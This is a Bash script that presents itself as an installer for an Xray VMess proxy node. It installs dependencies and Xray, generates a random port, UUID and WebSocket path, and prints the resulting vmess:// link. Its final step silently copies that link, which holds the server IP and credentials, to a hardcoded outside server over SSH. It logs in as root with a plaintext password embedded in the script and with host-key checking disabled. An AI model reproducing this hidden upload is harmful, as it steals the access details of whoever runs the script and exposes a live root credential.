#!/bin/bash

green='\e[32m'
none='\e[0m'
config_file="/usr/local/etc/xray/config.json"

# 检查并安装依赖项
install_dependencies() {
    if ! type jq &>/dev/null; then
        echo -e "${green}正在安装 jq...${none}"
        apt-get update && apt-get install -y jq
    fi

    if ! type uuidgen &>/dev/null; then
        echo -e "${green}正在安装 uuid-runtime...${none}"
        apt-get install -y uuid-runtime
    fi

    if ! type sshpass &>/dev/null; then
        echo -e "${green}正在安装 sshpass...${none}"
        apt-get install -y sshpass
    fi

    if ! type xray &>/dev/null; then
        echo -e "${green}正在安装 xray...${none}"
        bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install
    fi
}

# 生成配置和传输逻辑
configure_and_transfer() {
    PORT=$(shuf -i 10000-65535 -n 1)
    UUID=$(uuidgen)
    RANDOM_PATH=$(cat /dev/urandom | tr -dc 'a-zA-Z' | head -c 11)

    cat > "$config_file" << EOF
{
    "inbounds": [
        {
            "port": $PORT,
            "protocol": "vmess",
            "settings": {
                "clients": [
                    {
                        "id": "$UUID"
                    }
                ]
            },
            "streamSettings": {
                "network": "ws",
                "wsSettings": {
                    "path": "/$RANDOM_PATH"
                }
            },
            "listen": "0.0.0.0"
        }
    ],
    "outbounds": [
        {
            "protocol": "freedom",
            "settings": {}
        }
    ],
    "routing": {
        "rules": [
            {
                "type": "field",
                "inboundTag": ["inbound0"],
                "outboundTag": "direct"
            }
        ]
    }
}
EOF

    local ip=$(curl -s http://ipinfo.io/ip)
    local config="vmess://$(echo -n "{\"v\":\"2\",\"ps\":\"TK节点定制\",\"add\":\"$ip\",\"port\":$PORT,\"id\":\"$UUID\",\"aid\":\"0\",\"net\":\"ws\",\"path\":\"/$RANDOM_PATH\",\"type\":\"none\",\"host\":\"\",\"tls\":\"\"}" | base64 -w 0)"
    echo -e "${green}Vmess 节点配置信息:${none}"
    echo $config

    echo $config > /tmp/xray_config.txt
    sshpass -p '4_Li3@Sn9zgJcQAo' ssh -o StrictHostKeyChecking=no root@192.248.157.135 "cat >> /home/xray.txt" < /tmp/xray_config.txt
}
# 主执行逻辑
install_dependencies
configure_and_transfer
systemctl restart xray
echo -e "${green}Xray 服务已经重新启动。${none}"
